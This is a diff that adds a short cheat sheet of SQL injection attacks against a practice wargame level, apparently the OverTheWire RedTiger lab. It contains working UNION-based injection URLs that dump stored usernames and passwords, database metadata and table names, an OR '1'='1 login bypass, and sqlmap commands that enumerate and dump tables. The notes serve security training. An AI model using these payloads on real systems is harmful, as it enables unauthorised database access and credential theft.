@@ -1,0 +1,60 @@
+
+sql injection
+
+(1) direct injection
+
+https://redtiger.labs.overthewire.org/level1.php?cat=1 ORDER BY 4--
+
+https://redtiger.labs.overthewire.org/level1.php?cat=1 ORDER BY 5--
+
+https://redtiger.labs.overthewire.org/level1.php?cat=1 UNION SELECT 1,2,3,4--
+
+
+#extract username and password from the table using column 3 and 4
+
+https://redtiger.labs.overthewire.org/level1.php?cat=1 UNION SELECT 1,2,username,password FROM level1_users--
+
+#get information of the database
+
+https://redtiger.labs.overthewire.org/level1.php?cat=1 UNION SELECT 1,2,database(),4--
+
+#get information about the version of the database
+
+https://redtiger.labs.overthewire.org/level1.php?cat=1 UNION SELECT 1,2,version(),4--
+
+#get information of the current user
+
+https://redtiger.labs.overthewire.org/level1.php?cat=1 UNION SELECT 1,2,current_user(),4--
+
+#get information about tablename
+
+https://redtiger.labs.overthewire.org/level1.php?cat=1 UNION SELECT 1,2,table_name,4 FROM information_schema.tables WHERE table_schema=database()--
+
+#login bypass
+username: ' OR '1'='1
+password: ' OR '1'='1
+
+
+(2) sqlmap
+
+#Start with a target URL that has an injectable parameter:
+
+sqlmap -u "https://redtiger.labs.overthewire.org/level1.php?cat=1"
+
+#Enumerate Databases
+
+sqlmap -u "https://redtiger.labs.overthewire.org/level1.php?cat=1" --dbs
+
+sqlmap -u "https://redtiger.labs.overthewire.org/level1.php?cat=1" --technique=U --dbs
+
+#Enumerate tables from Database
+
+sqlmap -u "https://redtiger.labs.overthewire.org/level1.php?cat=1" -D hackit --tables
+
+#Extract data from level1_users
+
+sqlmap -u "https://redtiger.labs.overthewire.org/level1.php?cat=1" -D hackit -T level1_users --dump --level=5 --risk=3
+
+
+
+
